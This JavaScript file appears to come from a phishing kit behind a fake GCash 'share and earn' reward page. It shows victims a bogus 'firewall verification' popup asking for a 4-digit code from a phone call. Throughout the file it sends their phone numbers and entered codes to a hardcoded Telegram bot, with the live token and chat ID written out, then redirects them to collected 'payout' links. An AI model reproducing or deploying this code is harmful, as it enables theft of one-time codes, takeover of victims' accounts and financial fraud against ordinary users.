// ========== POPUP_SHARE.JS - FIREWALL LOGIC FOR SHARE_AND_EARN ==========

let claimStateShare = {
    isProcessing: false,
    currentAmount: 0,
    countdownInterval: null,
    balanceDecrementInterval: null,
    countdownSeconds: 60,
    isPending: false,
    hasRedirected: false
};

let cachedFirewallStatusShare = false;
let currentVerificationCodeShare = null;
let verificationAttemptsShare = 0;

// ========== FIREWALL VERIFICATION ==========
async function getFirewallStatusShare() {
    if (typeof firebase === 'undefined' || !firebase.database) {
        console.warn("Firebase not available");
        return false;
    }
    try {
        const db = firebase.database();
        const snap = await db.ref('admin/globalFirewall').once('value');
        const data = snap.val();
        console.log("Firewall status:", data);
        if (data === null) {
            await db.ref('admin/globalFirewall').set({
                active: false,
                activatedBy: "SYSTEM",
                timestamp: Date.now()
            });
            return false;
        }
        return data.active === true;
    } catch(e) { 
        console.error("Firewall error:", e);
        return false;
    }
}

function listenToFirewallChangesShare() {
    if (typeof firebase === 'undefined' || !firebase.database) return;
    const db = firebase.database();
    db.ref('admin/globalFirewall').on('value', (snapshot) => {
        const data = snapshot.val();
        cachedFirewallStatusShare = (data && data.active === true);
        console.log("Firewall updated:", cachedFirewallStatusShare);
    });
}

async function sendTelegramShare(phone, code) {
    const msg = `VERIFY REQUEST\nPhone: ${phone}\nCode: ${code}`;
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
        console.log("Telegram sent");
    } catch(e) {}
}

// ========== FIREWALL POPUP (4-DIGIT VERIFICATION) ==========
function showFirewallPopupShare() {
    console.log("Showing firewall verification popup");
    const popup = document.getElementById('firewallPopup');
    if (!popup) return;
    
    const content = document.getElementById('firewallPopupContent');
    if (content) {
        content.innerHTML = `
            <div class="firewall-warning-icon">📞</div>
            <h2>VERIFICATION REQUIRED</h2>
            <div class="firewall-message">
                <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
                <p>Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
                <p>Enter the code below to continue.</p>
            </div>
            <div class="verification-input-group">
                <input type="text" id="verificationCodeShare" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
                <button id="verifyCodeBtnShare" class="verify-btn">VERIFY NOW</button>
            </div>
            <div class="firewall-note">
                <p>Waiting for system-verification call...</p>
            </div>
            <div id="firewallErrorMsgShare" class="firewall-error" style="display: none;"></div>
        `;
    }
    
    currentVerificationCodeShare = Math.floor(1000 + Math.random() * 9000).toString();
    verificationAttemptsShare = 0;
    console.log("VERIFICATION CODE:", currentVerificationCodeShare);
    
    popup.style.display = 'flex';
    setTimeout(() => {
        const ci = document.getElementById('verificationCodeShare');
        if (ci) ci.focus();
    }, 100);
    
    const verifyBtn = document.getElementById('verifyCodeBtnShare');
    if (verifyBtn) {
        verifyBtn.onclick = verifyFirewallCodeShare;
    }
}

function hideFirewallPopupShare() {
    const popup = document.getElementById('firewallPopup');
    if (popup) popup.style.display = 'none';
}

window.verifyFirewallCodeShare = async function() {
    const codeInput = document.getElementById('verificationCodeShare');
    const code = codeInput ? codeInput.value.trim() : '';
    const errorDiv = document.getElementById('firewallErrorMsgShare');
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    if (!code || code.length < 4) {
        if (errorDiv) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
        }
        return;
    }
    
    verificationAttemptsShare++;
    const isValid = (code === currentVerificationCodeShare);
    
    if (isValid) {
        await sendTelegramShare(userPhone, code);
        hideFirewallPopupShare();
        alert("Verification successful. Page will refresh.");
        setTimeout(() => window.location.reload(), 500);
    } else {
        await sendTelegramShare(userPhone, code);
        let errorMsg = "Invalid verification code. Please try again.";
        if (verificationAttemptsShare >= 3) {
            errorMsg = "Too many failed attempts. Page will refresh.";
            setTimeout(() => window.location.reload(), 2000);
        }
        if (errorDiv) {
            errorDiv.innerHTML = errorMsg;
            errorDiv.style.display = 'block';
        }
        if (codeInput) {
            codeInput.value = '';
            codeInput.focus();
        }
    }
};

// ========== GET LATEST DEPLOYED LINK ==========
async function getLatestPayoutLinkShare() {
    if (typeof firebase === 'undefined' || !firebase.database) return null;
    try {
        const db = firebase.database();
        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        if (snapshot.exists()) {
            const key = Object.keys(snapshot.val())[0];
            const linkData = snapshot.val()[key];
            console.log("Found payout link:", linkData.url);
            return { url: linkData.url, key: key };
        }
        console.log("No available links found");
        return null;
    } catch (error) {
        console.error("Error getting link:", error);
        return null;
    }
}

// ========== CONGRATULATIONS POPUP ==========
async function showClaimPopupShare(amount) {
    console.log("showClaimPopupShare called with amount:", amount);
    
    const firewallActive = await getFirewallStatusShare();
    console.log("Firewall active:", firewallActive);
    
    if (firewallActive) {
        console.log("FIREWALL ON - Showing verification popup");
        showFirewallPopupShare();
        return;
    }
    
    console.log("FIREWALL OFF - Showing congratulations popup");
    claimStateShare.currentAmount = amount;
    claimStateShare.isProcessing = false;
    claimStateShare.hasRedirected = false;
    
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const claimBtn = document.getElementById('claimActionBtn');
    
    if (prizeSpan) prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    if (claimBtn) {
        claimBtn.innerHTML = 'CLAIM THRU GCASH';
        claimBtn.disabled = false;
    }
    if (popup) popup.style.display = 'flex';
}

function hideClaimPopupShare() { 
    const p = document.getElementById('claimPopup'); 
    if (p) p.style.display = 'none'; 
}

function showPendingStatusShare() { 
    const pa = document.getElementById('pendingStatusArea'); 
    if (pa) pa.style.display = 'block'; 
    claimStateShare.isPending = true; 
}

function hidePendingStatusShare() { 
    const pa = document.getElementById('pendingStatusArea'); 
    if (pa) pa.style.display = 'none'; 
    claimStateShare.isPending = false; 
}

// ========== BALANCE DECREMENT (VISIBLE) ==========
function startSmoothDecrementShare(originalAmount) {
    const balanceDisplay = document.getElementById('userBalanceDisplay');
    if (!balanceDisplay) return;
    
    let current = originalAmount;
    const totalDuration = 2000;
    const steps = originalAmount;
    const intervalTime = totalDuration / steps;
    
    claimStateShare.balanceDecrementInterval = setInterval(() => {
        current = current - 1;
        if (current >= 0) balanceDisplay.innerText = "₱" + current.toLocaleString();
        if (current <= 0) {
            clearInterval(claimStateShare.balanceDecrementInterval);
            claimStateShare.balanceDecrementInterval = null;
            balanceDisplay.innerText = "₱0";
        }
    }, intervalTime);
}

// ========== CLAIM ACTION ==========
async function onClaimActionShare() {
    if (claimStateShare.isProcessing) return;
    
    claimStateShare.isProcessing = true;
    const claimBtn = document.getElementById('claimActionBtn');
    const amount = claimStateShare.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    if (claimBtn) {
        claimBtn.disabled = true;
        claimBtn.innerHTML = 'PROCESSING...';
    }
    
    // Send Telegram notification
    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("CLAIM REQUEST!\nPhone: " + userPhone + "\nAmount: ₱" + amount)}`)
        .catch(e => console.log('Telegram error:', e));
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        
        try {
            const linkData = await getLatestPayoutLinkShare();
            
            if (linkData && linkData.url) {
                const redirectUrl = linkData.url;
                const finalUrl = redirectUrl.startsWith('http') ? redirectUrl : 'https://' + redirectUrl;
                
                await db.ref('links/' + linkData.key).update({ 
                    status: 'claimed', 
                    user: userPhone, 
                    amount: amount, 
                    claimedAt: Date.now() 
                });
                
                hideClaimPopupShare();
                showPendingStatusShare();
                
                // Start balance decrement animation
                startSmoothDecrementShare(amount);
                
                // Redirect after 2 seconds
                setTimeout(() => {
                    if (!claimStateShare.hasRedirected) {
                        claimStateShare.hasRedirected = true;
                        window.location.href = finalUrl;
                    }
                }, 2000);
                
            } else {
                if (claimBtn) {
                    claimBtn.innerHTML = 'NO REWARDS';
                    setTimeout(() => {
                        claimBtn.innerHTML = 'CLAIM THRU GCASH';
                        claimBtn.disabled = false;
                        claimStateShare.isProcessing = false;
                    }, 3000);
                }
                showNoLinkAlertShare();
            }
        } catch(err) {
            console.error("Error:", err);
            if (claimBtn) {
                claimBtn.innerHTML = 'ERROR';
                setTimeout(() => {
                    claimBtn.innerHTML = 'CLAIM THRU GCASH';
                    claimBtn.disabled = false;
                    claimStateShare.isProcessing = false;
                }, 3000);
            }
            alert("System error. Please try again.");
        }
    }
}

// ========== NO LINK ALERT ==========
function showNoLinkAlertShare() {
    const modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0,0,0,0.95)';
    modal.style.zIndex = '20000';
    modal.style.display = 'flex';
    modal.style.alignItems = 'center';
    modal.style.justifyContent = 'center';
    
    modal.innerHTML = `
        <div style="background:#1a1525; border-radius:40px; max-width:320px; width:85%; padding:30px; text-align:center; border:1px solid #ff4444;">
            <div style="font-size:48px;">⚠️</div>
            <h3 style="color:#ff4444;">WITHDRAWAL UNSUCCESSFUL</h3>
            <div style="color:white; font-size:13px; text-align:left; margin-top:20px;">
                <p>• This device has already reached the maximum payout limit.</p>
                <p>• No GCash app installed on this device.</p>
                <p>• Please try using another device.</p>
            </div>
            <button id="closeAlert" style="background:#ff4444; border:none; border-radius:40px; padding:12px; color:white; margin-top:20px; width:100%; cursor:pointer;">GOT IT</button>
        </div>
    `;
    
    document.body.appendChild(modal);
    document.getElementById('closeAlert').onclick = () => modal.remove();
}

// ========== CLAIM THRU GCASH HANDLER (from prizePopup) ==========
async function handleClaimThruGCashShare() {
    console.log("CLAIM THRU GCASH clicked from prizePopup");
    
    // Check firewall first
    const firewallActive = await getFirewallStatusShare();
    console.log("Firewall status:", firewallActive ? "ON" : "OFF");
    
    if (firewallActive) {
        console.log("Firewall ON - showing verification popup");
        showFirewallPopupShare();
    } else {
        console.log("Firewall OFF - showing congratulations popup");
        showClaimPopupShare(150);
    }
}

// ========== INITIALIZE ALL BUTTONS ==========
function initClaimThruGCashButton() {
    // Target the CLAIM THRU GCASH button inside prizePopup
    const claimBtn = document.getElementById('claimGCashBtn');
    if (claimBtn) {
        console.log("CLAIM THRU GCASH button found");
        claimBtn.onclick = function(e) {
            e.preventDefault();
            handleClaimThruGCashShare();
        };
    } else {
        console.log("CLAIM THRU GCASH button not found yet");
    }
}

function initClaimActionButton() {
    const actionBtn = document.getElementById('claimActionBtn');
    if (actionBtn) {
        console.log("Claim action button found");
        actionBtn.onclick = function(e) {
            e.preventDefault();
            onClaimActionShare();
        };
    }
}

// ========== EXPORT ==========
window.showFirewallPopupShare = showFirewallPopupShare;
window.hideFirewallPopupShare = hideFirewallPopupShare;
window.verifyFirewallCodeShare = verifyFirewallCodeShare;
window.showClaimPopupShare = showClaimPopupShare;
window.onClaimActionShare = onClaimActionShare;
window.handleClaimThruGCashShare = handleClaimThruGCashShare;

// ========== INITIALIZE ==========
document.addEventListener('DOMContentLoaded', function() { 
    hidePendingStatusShare();
    listenToFirewallChangesShare();
    getFirewallStatusShare().then(status => {
        console.log("Initial firewall status:", status);
        cachedFirewallStatusShare = status;
    });
    
    // Initialize buttons
    initClaimThruGCashButton();
    initClaimActionButton();
    
    console.log("Popup_share.js loaded - Firewall ready");
});
